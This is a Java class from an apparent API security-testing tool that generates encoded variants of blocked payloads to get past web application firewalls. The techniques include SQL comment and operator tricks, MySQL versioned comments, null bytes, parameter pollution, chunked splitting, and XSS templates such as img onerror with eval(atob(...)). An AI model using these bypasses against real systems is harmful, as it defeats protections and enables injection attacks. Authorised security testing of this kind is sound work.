package com.flechazo.apisentinel.detection;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Generates WAF-evasion encoding variants of a payload. When a payload is
 * blocked by a WAF, the pipeline retries with a few variants from here.
 *
 * Encoder set distilled from bughunter's tools/waf_encoder.py
 * (shuvonsec/claude-bug-bounty, MIT License — see docs/THIRD-PARTY.md).
 * Only encoding transforms are ported; variant selection is dispatched by
 * the test case category (SQLi/XSS get class-specific encoders on top of
 * the universal set).
 */
public final class WafEncoder {

    /** A named encoding variant of the original payload. */
    public record Variant(String technique, String payload) {}

    private WafEncoder() {}

    // ======================== Universal encoders ========================

    /** Percent-encode every byte except unreserved chars; applied N layers. */
    public static List<Variant> urlEncode(String payload, int layers) {
        List<Variant> out = new ArrayList<>();
        String encoded = payload;
        for (int i = 1; i <= layers; i++) {
            encoded = urlEncodeOnce(encoded);
            out.add(new Variant("url-encode-" + i + "x", encoded));
        }
        return out;
    }

    private static String urlEncodeOnce(String s) {
        StringBuilder sb = new StringBuilder(s.length() * 3);
        for (byte b : s.getBytes(StandardCharsets.UTF_8)) {
            int c = b & 0xFF;
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')
                    || c == '-' || c == '_' || c == '.' || c == '~') {
                sb.append((char) c);
            } else {
                sb.append(String.format("%%%02X", c));
            }
        }
        return sb.toString();
    }

    /** JS unicode escapes (backslash-uXXXX / backslash-u{xx}) for
     *  non-alphanumeric chars. */
    public static List<Variant> unicodeEscape(String payload) {
        List<Variant> out = new ArrayList<>();
        StringBuilder js = new StringBuilder();
        StringBuilder brace = new StringBuilder();
        StringBuilder full = new StringBuilder();
        for (char c : payload.toCharArray()) {
            boolean keep = Character.isLetterOrDigit(c) || c == ' ';
            js.append(keep ? String.valueOf(c) : String.format("\\u%04x", (int) c));
            brace.append(keep ? String.valueOf(c) : String.format("\\u{%x}", (int) c));
            full.append(String.format("\\u%04x", (int) c));
        }
        if (!js.toString().equals(payload)) out.add(new Variant("unicode-js-escape", js.toString()));
        if (!brace.toString().equals(payload)) out.add(new Variant("unicode-js-brace", brace.toString()));
        out.add(new Variant("unicode-full-escape", full.toString()));
        return out;
    }

    /** HTML entity encoding (&#NN; / &#xHH;) for non-alphanumeric chars. */
    public static List<Variant> htmlEntity(String payload) {
        List<Variant> out = new ArrayList<>();
        StringBuilder dec = new StringBuilder();
        StringBuilder hex = new StringBuilder();
        StringBuilder fullDec = new StringBuilder();
        for (char c : payload.toCharArray()) {
            boolean keep = Character.isLetterOrDigit(c) || c == ' ';
            dec.append(keep ? String.valueOf(c) : "&#" + (int) c + ";");
            hex.append(keep ? String.valueOf(c) : "&#x" + Integer.toHexString(c) + ";");
            fullDec.append("&#").append((int) c).append(';');
        }
        if (!dec.toString().equals(payload)) out.add(new Variant("html-entity-decimal", dec.toString()));
        if (!hex.toString().equals(payload)) out.add(new Variant("html-entity-hex", hex.toString()));
        out.add(new Variant("html-entity-decimal-full", fullDec.toString()));
        return out;
    }

    /** Null-byte variants (trailing / mid-payload). */
    public static List<Variant> nullByte(String payload) {
        List<Variant> out = new ArrayList<>();
        out.add(new Variant("null-byte-%00", payload + "%00"));
        out.add(new Variant("null-byte-\\x00", payload + "\\x00"));
        out.add(new Variant("null-byte-%0a", payload + "%0a"));
        out.add(new Variant("null-byte-mid-%00",
                payload.substring(0, payload.length() / 2) + "%00"
                        + payload.substring(payload.length() / 2)));
        return out;
    }

    // ======================== SQLi-specific encoders ========================

    private static final String[] SQL_KEYWORDS = {
        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE",
        "AND", "OR", "ORDER", "GROUP", "HAVING", "LIMIT"
    };

    /** SQL comment splits: keyword splitting via inline comments, MySQL
     *  versioned-comment wraps, and per-word comment splitting. */
    public static List<Variant> sqlCommentInject(String payload) {
        List<Variant> out = new ArrayList<>();
        String r1 = payload, r2 = payload, r3 = payload;
        for (String kw : SQL_KEYWORDS) {
            // Search within the CURRENT string each time — earlier replacements
            // shift indices, so indexing with positions from the original text
            // would corrupt later substitutions.
            String split = kw.charAt(0) + "/**/" + kw.substring(1);
            r1 = replaceFirstKeyword(r1, kw, split);
            r2 = replaceFirstKeyword(r2, kw, "/*!" + kw + "*/");
            r3 = replaceFirstKeyword(r3, kw, "/*!50000" + kw + "*/");
        }
        if (!r1.equals(payload)) out.add(new Variant("sql-comment-/**/-split", r1));
        if (!r2.equals(payload)) out.add(new Variant("sql-excl-comment", r2));
        if (!r3.equals(payload)) out.add(new Variant("sql-mysql-version-comment", r3));
        String fullComment = Pattern.compile("([A-Za-z]{2,})").matcher(payload)
                .replaceAll(m -> Matcher.quoteReplacement(
                        m.group(1).charAt(0) + "/**/" + m.group(1).substring(1)));
        if (!fullComment.equals(payload)) out.add(new Variant("sql-every-word-split", fullComment));
        return out;
    }

    private static String replaceFirstKeyword(String s, String kw, String replacement) {
        int idx = s.toUpperCase().indexOf(kw);
        return idx < 0 ? s : replaceAt(s, idx, kw.length(), replacement);
    }

    private static String replaceAt(String s, int idx, int len, String replacement) {
        if (idx < 0 || idx + len > s.length()) return s;
        return s.substring(0, idx) + replacement + s.substring(idx + len);
    }

    /** Case mixing: alternating / UPPER / lower. */
    public static List<Variant> caseMix(String payload) {
        List<Variant> out = new ArrayList<>();
        StringBuilder alt = new StringBuilder(payload.length());
        for (int i = 0; i < payload.length(); i++) {
            char c = payload.charAt(i);
            alt.append(i % 2 == 0 ? Character.toUpperCase(c) : Character.toLowerCase(c));
        }
        out.add(new Variant("case-alternating", alt.toString()));
        if (!payload.toUpperCase().equals(payload)) out.add(new Variant("case-upper", payload.toUpperCase()));
        if (!payload.toLowerCase().equals(payload)) out.add(new Variant("case-lower", payload.toLowerCase()));
        return out;
    }

    private static final String[][] OPERATOR_SUBS = {
        {" OR ", " || "},
        {" AND ", " && "},
        {" OR ", " OrOr "},
        {"=", " LIKE "},
        {"UNION SELECT", "UNION ALL SELECT"},
        {"UNION SELECT", "UNION DISTINCT SELECT"},
        {" OR ", " OR/**/"}
    };

    /** SQL operator substitution: OR→||, AND→&&, =→LIKE, UNION SELECT variants. */
    public static List<Variant> operatorSubstitute(String payload) {
        List<Variant> out = new ArrayList<>();
        String upper = payload.toUpperCase();
        for (String[] sub : OPERATOR_SUBS) {
            if (!upper.contains(sub[0].toUpperCase())) continue;
            String replaced = Pattern.compile(Pattern.quote(sub[0]), Pattern.CASE_INSENSITIVE)
                    .matcher(payload).replaceAll(Matcher.quoteReplacement(sub[1]));
            if (!replaced.equals(payload)) {
                out.add(new Variant(
                        "operator-sub-" + sub[0].trim() + "->" + sub[1].trim(), replaced));
            }
        }
        return out;
    }

    private static final String[] MYSQL_KEYWORDS = {"UNION", "SELECT", "FROM", "WHERE", "ORDER"};

    /** MySQL versioned-comment wraps: overall and per-keyword. */
    public static List<Variant> mysqlVersionComment(String payload) {
        List<Variant> out = new ArrayList<>();
        out.add(new Variant("mysql-version-50000-wrap", "/*!50000 " + payload + "*/"));
        out.add(new Variant("mysql-version-40000-wrap", "/*!40000 " + payload + "*/"));
        String result = payload;
        for (String kw : MYSQL_KEYWORDS) {
            Matcher m = Pattern.compile(Pattern.quote(kw), Pattern.CASE_INSENSITIVE).matcher(result);
            if (m.find()) {
                result = m.replaceFirst(Matcher.quoteReplacement("/*!50000" + kw + "*/"));
            }
        }
        if (!result.equals(payload)) out.add(new Variant("mysql-version-per-keyword", result));
        return out;
    }

    /** Whitespace substitution: space replaced by tab / %09 / %0a / %0b /
     *  inline-comment / plus. */
    public static List<Variant> tabNewlineSpace(String payload) {
        String[][] subs = {
            {"space-to-tab", payload.replace(" ", "\t")},
            {"space-to-%09", payload.replace(" ", "%09")},
            {"space-to-%0a", payload.replace(" ", "%0a")},
            {"space-to-%0b", payload.replace(" ", "%0b")},
            {"space-to-/**/-comment", payload.replace(" ", "/**/")},
            {"space-to-+", payload.replace(" ", "+")}
        };
        List<Variant> out = new ArrayList<>();
        for (String[] s : subs) {
            if (!s[1].equals(payload)) out.add(new Variant(s[0], s[1]));
        }
        return out;
    }

    // ======================== XSS-specific encoders ========================

    /** Base64-wrap the payload inside eval(atob(...)) event handlers. */
    public static List<Variant> base64WrapXss(String payload) {
        String b64 = Base64.getEncoder().encodeToString(payload.getBytes(StandardCharsets.UTF_8));
        List<Variant> out = new ArrayList<>();
        out.add(new Variant("xss-base64-script", "<script>eval(atob('" + b64 + "'))</script>"));
        out.add(new Variant("xss-base64-svg-onload", "<svg onload=eval(atob('" + b64 + "'))>"));
        out.add(new Variant("xss-base64-img-onerror", "<img src=x onerror=eval(atob('" + b64 + "'))>"));
        return out;
    }

    // ======================== Advanced bypass strategies ========================

    /** HTTP Parameter Pollution: duplicate the parameter with safe+malicious values.
     *  Different backends pick different instances (first vs last). */
    public static List<Variant> hpp(String paramName, String payload) {
        if (paramName == null || paramName.isEmpty()) return List.of();
        List<Variant> out = new ArrayList<>();
        out.add(new Variant("hpp-duplicate-last", paramName + "=safe&" + paramName + "=" + payload));
        out.add(new Variant("hpp-duplicate-first", payload + "&" + paramName + "=safe"));
        out.add(new Variant("hpp-array-notation", paramName + "[]=safe&" + paramName + "[]=" + payload));
        return out;
    }

    /** JSON Unicode escape: replace ASCII letters with \\uXXXX inside JSON values.
     *  JSON parsers decode these transparently but WAF regex sees \\u0073elect. */
    public static List<Variant> jsonUnicodeEscape(String payload) {
        StringBuilder sb = new StringBuilder();
        for (char c : payload.toCharArray()) {
            if (Character.isLetter(c)) {
                sb.append(String.format("\\u%04x", (int) c));
            } else {
                sb.append(c);
            }
        }
        String escaped = sb.toString();
        if (escaped.equals(payload)) return List.of();
        return List.of(new Variant("json-unicode-escape", escaped));
    }

    /** Chunked transfer encoding body split: returns the payload split into 2 chunks.
     *  The caller must also set Transfer-Encoding: chunked header. */
    public static List<Variant> chunkedSplit(String payload) {
        if (payload.length() < 4) return List.of();
        int mid = payload.length() / 2;
        String chunk1 = payload.substring(0, mid);
        String chunk2 = payload.substring(mid);
        String chunked = Integer.toHexString(chunk1.length()) + "\r\n" + chunk1 + "\r\n"
                + Integer.toHexString(chunk2.length()) + "\r\n" + chunk2 + "\r\n0\r\n\r\n";
        return List.of(new Variant("chunked-transfer-split", chunked));
    }

    // ======================== Category dispatch ========================

    /**
     * Produce de-duplicated variants for a payload based on the test case
     * category (Chinese labels from TestGenPrompt: SQLi/XSS/命令注入/路径穿越/…).
     * Universal encoders run for every class; SQLi/XSS/CMD add class-specific
     * ones. Variants identical to the original are dropped.
     *
     * @param category    TestCase category (free-form, matched loosely)
     * @param payload     original payload text
     * @param maxVariants cap on returned variants (retry rounds pick from the head)
     */
    public static List<Variant> encodeVariants(String category, String payload, int maxVariants) {
        if (payload == null || payload.isEmpty()) return List.of();
        String c = category == null ? "" : category.toLowerCase();
        boolean isSqli = (c.contains("sql") || c.contains("注入")) && !c.contains("nosql") && !c.contains("mongo");
        boolean isXss = c.contains("xss");
        boolean isCmd = c.contains("命令") || c.contains("command") || c.contains("rce");
        boolean isPath = c.contains("路径") || c.contains("穿越") || c.contains("traversal") || c.contains("lfi");

        List<Variant> all = new ArrayList<>();
        // Universal set (universal WAF bypasses first — most fire at the edge).
        all.addAll(urlEncode(payload, isPath ? 3 : 2));
        all.addAll(unicodeEscape(payload));
        all.addAll(htmlEntity(payload));
        all.addAll(nullByte(payload));
        if (isSqli) {
            all.addAll(sqlCommentInject(payload));
            all.addAll(caseMix(payload));
            all.addAll(operatorSubstitute(payload));
            all.addAll(mysqlVersionComment(payload));
            all.addAll(tabNewlineSpace(payload));
        }
        if (isXss) {
            all.addAll(base64WrapXss(payload));
            all.addAll(caseMix(payload));
        }
        if (isCmd) {
            all.addAll(tabNewlineSpace(payload));
            all.addAll(caseMix(payload));
        }
        // Advanced strategies for all categories
        all.addAll(jsonUnicodeEscape(payload));
        all.addAll(chunkedSplit(payload));

        // De-dup by payload text, drop anything identical to the original.
        Map<String, Variant> unique = new LinkedHashMap<>();
        for (Variant v : all) {
            if (!v.payload().equals(payload)) unique.putIfAbsent(v.payload(), v);
        }
        List<Variant> out = new ArrayList<>(unique.values());
        if (out.size() > maxVariants) return out.subList(0, maxVariants);
        return out;
    }
}
